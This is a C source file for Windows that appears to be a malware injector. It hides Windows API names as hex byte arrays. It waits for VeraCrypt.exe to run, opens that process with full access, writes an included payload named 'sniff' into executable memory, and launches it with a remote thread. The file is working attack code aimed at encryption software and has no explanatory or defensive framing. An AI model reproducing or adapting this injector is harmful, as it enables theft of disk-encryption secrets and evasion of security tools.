#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>

#define UTILS_IMPLEMENTATION
#include "../c_utils/utils.h"

extern DWORD ExecuteRemoteThread64(HANDLE hTargetProc, LPVOID lpvRemotePayloadMem, PHANDLE hThread);

int main(void)
{
    char cProlog[] = {0xFFFFFFFFFFFF};
    HMODULE hKernel = UtilsGetKernelModuleHandle();

    if (hKernel == NULL)
    {
        return 0;
    }

    char cGetProcAddress[] = {0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0};
    FARPROC(WINAPI * pGetProcAddress)
    (HMODULE hModule, LPCSTR lpProcName) = UtilsGetProcAddressByName(hKernel, cGetProcAddress);

    char cVeraCrypt[] = {0x56, 0x65, 0x72, 0x61, 0x43, 0x72, 0x79, 0x70, 0x74, 0x2e, 0x65, 0x78, 0x65, 0};

    char cSleep[] = {0x53, 0x6c, 0x65, 0x65, 0x70, 0};
    void(WINAPI * pSleep)(DWORD dwMilliseconds) = pGetProcAddress(hKernel, cSleep);

    DWORD dwProcID = -1;
    while (1)
    {
        dwProcID = FindTargetProcessID(cVeraCrypt);

        if (dwProcID != -1)
        {
            break;
        }

        pSleep(5000);
    }

    char cOpenProcess[] = {0x4f, 0x70, 0x65, 0x6e, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0};
    HANDLE(WINAPI * pOpenProcess)
    (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) = pGetProcAddress(hKernel, cOpenProcess);

    HANDLE hTargetProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcID);
    if (hTargetProc == NULL)
    {
        return 0;
    }

#include "sniff.x64.bin.h"

    char cVirtualAllocEx[] = {0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x45, 0x78, 0};
    LPVOID(WINAPI * pVirtualAllocEx)
    (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = pGetProcAddress(hKernel, cVirtualAllocEx);

    LPVOID lpvRemotePayloadMem = pVirtualAllocEx(hTargetProc, NULL, sniff_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READ);
    if (lpvRemotePayloadMem == NULL)
    {
        goto shutdown;
    }

    char cWriteProcessMemory[] = {0x57, 0x72, 0x69, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0};

    BOOL(WINAPI * pWriteProcessMemory)
    (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten) = pGetProcAddress(hKernel, cWriteProcessMemory);

    if (!pWriteProcessMemory(hTargetProc, lpvRemotePayloadMem, sniff_data, sniff_data_len, NULL))
    {
        goto shutdown;
    }

    HANDLE hThread = NULL;
    DWORD iRetVal = ExecuteRemoteThread64(hTargetProc, lpvRemotePayloadMem, &hThread);

    if (hThread != NULL)
    {
        char cResumeThread[] = {0x52, 0x65, 0x73, 0x75, 0x6d, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0};
        DWORD(WINAPI * pResumeThread)
        (HANDLE hHandle) = pGetProcAddress(hKernel, cResumeThread);

        pResumeThread(hThread);
    }

    char cOutputDebugStringA[] = {0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x44, 0x65, 0x62, 0x75, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x41, 0};
    void(WINAPI * pOutputDebugStringA)(LPCSTR lpOutputString) = pGetProcAddress(hKernel, cOutputDebugStringA);

    char cPrintString[] = {0x59, 0x6f, 0x6f, 0x68, 0x6f, 0x6f, 0x6f, 0x21, 0x21, 0x21, 0};
    pOutputDebugStringA(cPrintString);

shutdown:
    char cCloseHandle[] = {0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0};
    BOOL(WINAPI * pCloseHandle)
    (HANDLE hObject) = pGetProcAddress(hKernel, cCloseHandle);

    if (pCloseHandle == NULL)
    {
        return 0;
    }

    pCloseHandle(hTargetProc);
    char cEpilog[] = {0xAAAAAAAAAAAAAA};
    return 0;
}
